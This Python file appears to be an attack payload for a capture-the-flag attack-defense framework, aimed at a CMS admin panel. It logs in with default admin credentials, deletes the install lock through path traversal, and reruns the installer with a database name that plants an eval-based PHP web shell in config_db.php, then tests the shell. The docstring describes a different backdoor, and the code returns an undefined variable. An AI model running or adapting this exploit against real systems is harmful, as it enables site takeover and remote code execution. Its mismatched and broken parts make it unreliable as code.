'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from utils import Utils


class P(Payload):
    def attack(self):
        try:
            # login
            s = requests.Session()
            s.get('http://{0}/admin/login.php'.format(self.host))
            url = 'http://{0}/admin/index.php?lang=cn&anyid=&n=login&c=login&a=dologin&langset='.format(self.host)
            s.post(url,data={
                'action':'login',
                'login_name':'admin',
                'login_pass':'admin123',
                'Submit':''
            },timeout=2,allow_redirects=False)
            # delete
            deleteUrl = 'http://{}/admin/app/batch/csvup.php?fileField=test-1&flienamecsv=../../../config/install.lock'.format(self.host)
            s.get(deleteUrl,timeout=2)
            # reinstall
            reinstallUrl = 'http://{}/install/index.php?action=db_setup'.format(self.host)
            res = s.post(reinstallUrl,data={
                'setup':1,
                'db_type':'mysql',
                'db_prefix':'met_',
                'db_host':'localhost',
                'db_name':'met#*/@eval($_POST[c]);/*',
                'cndata':'yes',
                'endata':'yes',
                'showdata':'yes'
            },timeout=2,allow_redirects=False)
            print(res.text)
            # shell
            shellUrl = 'http://{}/config/config_db.php'.format(self.host)
            res = requests.post(shellUrl,data={
                'c':'echo seven;'
            },timeout=2)
            if res.status_code == 200 and 'seven' in res.text:
                return shell,'c'
            else:
                raise PayloadFailException('Shell Upload Fail')
        except Exception as e:
            raise PayloadFailException(str(e))

